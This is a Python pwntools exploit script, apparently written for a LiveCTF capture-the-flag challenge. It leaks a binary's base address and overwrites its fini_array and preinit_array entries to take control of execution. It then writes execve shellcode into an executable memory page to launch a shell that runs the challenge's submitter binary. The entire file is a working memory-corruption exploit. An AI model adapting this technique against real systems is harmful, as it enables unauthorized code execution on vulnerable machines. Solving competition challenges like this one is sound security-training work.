#!/usr/bin/env python3

from pwn import *
import binascii

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process('../handout/challenge')
#dbg = gdb.attach(io, gdbscript = '''
#continue
#''')

main_base = u64(io.recv(8))
print('main:', hex(main_base))

#
#   1) Can i chain continuous-jumps?
#   2) Can i write some data to known region?
#

# PC control fini_array
io.send(p64(main_base + 0x4338)); io.send(p64(main_base + 0x2000)) # direct PC control
io.send(p64(main_base + 0x4330)); io.send(p64(main_base + 0x1370)) # direct PC control (with init_array)
io.send(p64(main_base + 0x45B4)); io.send(p64(0))

# fix preinit_array -> make _preinit_array to ROP container
io.send(p64(main_base + 0x4310)); io.send(p64(0x4141414141414141)) 
io.send(p64(main_base + 0x4318)); io.send(p64(0x4141414141414141)) 
io.send(p64(main_base + 0x4320)); io.send(p64(0))

# done, goto main
io.send(p64(0))

pl = p32(2)*255
io.send(pl)

for i in range(255):
    io.recvline()

# exit
io.send(p32(0))
print( io.recvline() ) # maybe conglats

print('phase-2')

dd = u64(io.recv(8))
print('same:', hex(dd))

# rwx codespace again, Edit RWX page
context.arch = 'amd64'

def to_qwords(bb):
    ret = []

    for cursor in range(0, len(bb), 8):
        if cursor + 8 < len(bb):
            ret.append(u64(bb[cursor:cursor + 8]))
        else:
            bx = bb[cursor:]
            pad = b'\x00' * (8 - len(bx))
            ret.append(u64(bx + pad))

    return ret

path = '/bin/sh'
argv = [path, '-c', '/home/livectf/submitter;./submitter;./submitter;./submitter']
envp = {'PATH': '/home/livectf:/usr/bin:/bin:/usr/local/bin', 'CWD': '/home/livectf/'}
shellme = b''
shellme += asm('xor rax, rax')
shellme += asm('xor rbx, rbx')
shellme += asm('xor rcx, rcx')
shellme += asm('xor rdx, rdx')
shellme += asm('xor rsi, rsi')
shellme += asm('xor rdi, rdi')
shellme += asm(shellcraft.amd64.linux.execve(path, argv, envp))
sc = to_qwords(shellme)

for pc in range(0, len(sc)):
    io.send(p64(main_base + 0x214e + (pc * 8)))
    io.send(p64(sc[pc]))

io.send(p32(0))
io.interactive()




